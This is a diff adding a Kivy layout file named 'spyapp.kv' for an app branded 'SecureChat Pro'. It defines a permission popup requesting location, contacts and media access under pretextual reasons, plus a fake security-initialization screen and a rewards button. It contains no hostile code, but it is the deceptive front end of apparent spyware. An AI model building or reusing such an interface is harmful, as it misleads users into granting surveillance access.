@@ -1,0 +1,135 @@
+# spyapp.kv
+<PermissionPopup>:
+    title: "Permissions Required"
+    size_hint: 0.8, 0.6
+    auto_dismiss: False
+    
+    BoxLayout:
+        orientation: 'vertical'
+        spacing: 15
+        padding: 20
+        
+        Label:
+            text: 'To use all features of SecureChat Pro,\\nwe need the following permissions:'
+            color: app.get_color_from_hex('#263238')
+            font_size: '16sp'
+            halign: 'center'
+            text_size: self.width, None
+        
+        Label:
+            text: '• Location access (for better connectivity)'
+            color: app.get_color_from_hex('#263238')
+            font_size: '14sp'
+            halign: 'left'
+            text_size: self.width, None
+        
+        Label:
+            text: '• Contacts (to find friends)'
+            color: app.get_color_from_hex('#263238')
+            font_size: '14sp'
+            halign: 'left'
+            text_size: self.width, None
+        
+        Label:
+            text: '• Media files (to share content)'
+            color: app.get_color_from_hex('#263238')
+            font_size: '14sp'
+            halign: 'left'
+            text_size: self.width, None
+        
+        BoxLayout:
+            size_hint: 1, 0.3
+            spacing: 10
+            
+            Button:
+                text: 'GRANT PERMISSIONS'
+                background_color: app.get_color_from_hex('#2962FF')
+                color: 1, 1, 1, 1
+                bold: True
+                on_press: root.grant_permissions()
+
+<RoundedButton@Button>:
+    background_color: 0, 0, 0, 0
+    color: 1, 1, 1, 1
+    bold: True
+    canvas.before:
+        Color:
+            rgba: app.get_color_from_hex('#2962FF')
+        RoundedRectangle:
+            size: self.size
+            pos: self.pos
+            radius: [15]
+
+<Header@BoxLayout>:
+    size_hint: 1, 0.2
+    spacing: 10
+    
+    Image:
+        source: 'data/logo/kivy-icon-64.png'
+        size_hint: 0.3, 1
+        allow_stretch: True
+    
+    BoxLayout:
+        orientation: 'vertical'
+        
+        Label:
+            text: 'SECURE CHAT PRO'
+            font_size: '24sp'
+            bold: True
+            color: app.get_color_from_hex('#2962FF')
+            size_hint_y: 0.6
+        
+        Label:
+            text: 'Enterprise Communication Suite'
+            font_size: '14sp'
+            color: app.get_color_from_hex('#263238')
+            size_hint_y: 0.4
+
+<ProgressBar>:
+    max: 100
+    size_hint: 1, 0.05
+
+<SecureChatApp>:
+    BoxLayout:
+        orientation: 'vertical'
+        padding: 30
+        spacing: 20
+        canvas:
+            Color:
+                rgba: app.get_color_from_hex('#F5F7FB')
+            Rectangle:
+                size: self.size
+                pos: self.pos
+        
+        Header:
+        
+        Label:
+            id: status_label
+            text: 'Initializing security protocol...'
+            color: app.get_color_from_hex('#263238')
+            font_size: '16sp'
+            size_hint: 1, 0.1
+            halign: 'center'
+            text_size: self.width, None
+        
+        ProgressBar:
+            id: progress_bar
+            max: 100
+            value: 0
+            size_hint: 1, 0.05
+        
+        BoxLayout:
+            size_hint: 1, 0.2
+            spacing: 15
+            
+            RoundedButton:
+                id: chat_btn
+                text: 'START CHATTING'
+                disabled: True
+                on_press: app.start_chatting()
+            
+            RoundedButton:
+                id: earn_btn
+                text: 'EARN REWARDS'
+                background_color: app.get_color_from_hex('#448AFF')
+                disabled: True
